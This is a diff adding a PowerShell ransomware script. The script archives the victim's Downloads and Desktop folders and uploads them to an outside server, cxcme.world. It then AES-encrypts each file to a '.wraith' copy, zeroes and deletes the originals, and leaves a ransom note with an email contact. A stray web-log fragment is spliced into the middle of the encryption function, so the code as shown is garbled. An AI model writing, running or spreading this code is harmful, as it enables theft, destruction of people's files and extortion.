@@ -1,0 +1,88 @@
+$encryptionKey = New-Object byte[] 32
+[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($encryptionKey)
+
+$iv = New-Object byte[] 16
+[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($iv)
+
+$encryptionKeyHex = [Convert]::ToBase64String($encryptionKey)
+$ivHex = [Convert]::ToBase64String($iv)
+
+$hostname = $env:COMPUTERNAME
+$zipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "${hostname}_${($encryptionKeyHex.Substring(0, 8))}.zip")
+
+function Compress-Directories {
+    param (
+        [string[]]$directories,
+        [string]$zipFilePath
+    )
+
+    $tempDir = New-Item -ItemType Directory -Path ([System.IO.Path]::Combine($env:TEMP, [System.Guid]::NewGuid().ToString()))
+
+    try {
+        foreach ($dir in $directories) {
+            if (Test-Path $dir) {
+                Copy-Item -Path $dir\* -Destination $tempDir -Recurse -Force
+            }
+        }
+
+        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFilePath -Force
+
+    } finally {
+        Remove-Item -Path $tempDir -Recurse -Force
+    }
+}
+
+$allDirectories = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop")
+
+Compress-Directories -directories $allDirectories -zipFilePath $zipFilePath
+
+Invoke-WebRequest -Uri "http://cxcme.world/uploads/upload.php" -Method POST -InFile $zipFilePath -UseBasicParsing -ErrorAction SilentlyContinue
+
+function Encrypt-File {
+    param (
+        [string]$inputFilePath,
+        [string]$outputFilePath,
+        [byte[]]$key,
+        [byte[]]$iv
+    )
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $aes.IV = $iv
+
+    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
+    $inputStream = [System.IO.File]::OpenRead($inputFilePath)
+    $outputStream = [System.IO.File]::Create($outputFilePath)
+    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+
+    $buffer = New-Object byte[] 1024
+    while (($read = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+        $cryptoStream.Write($buffer, 0, $read)
+    }
+
+    $cryptoStream.FlushFinalBlock()
+    $cryptoStream.Close()
+    $inputStream.Close()/upload.php     -       1.1     Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Wi
+    $outputStream.Close()
+}
+
+foreach ($dir in $allDirectories) {
+    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
+        if (-not $_.PSIsContainer) {
+            $newFilePath = "$($_.FullName).wraith"
+            Encrypt-File -inputFilePath $_.FullName -outputFilePath $newFilePath -key $encryptionKey -iv $iv
+
+            # Zero out the original file
+            $fileSize = (Get-Item $_.FullName).Length
+            $zeroes = New-Object byte[] $fileSize
+            [System.IO.File]::WriteAllBytes($_.FullName, $zeroes)
+
+            # Delete the original file
+            Remove-Item $_.FullName -Force
+            }
+        }
+    }
+
+$tempPath = "$env:USERPROFILE\Desktop"
+$htmlFilePath = [System.IO.Path]::Combine($tempPath, "RANSOM_NOTE.html")
+Set-Content -Path $htmlFilePath -Value "<h1>All your files have been encrypted. Contact: lkjlfjrljlrkgjeroigjrg@onionmail.com to decrypt them.</h1>" -Encoding UTF8                                                                               
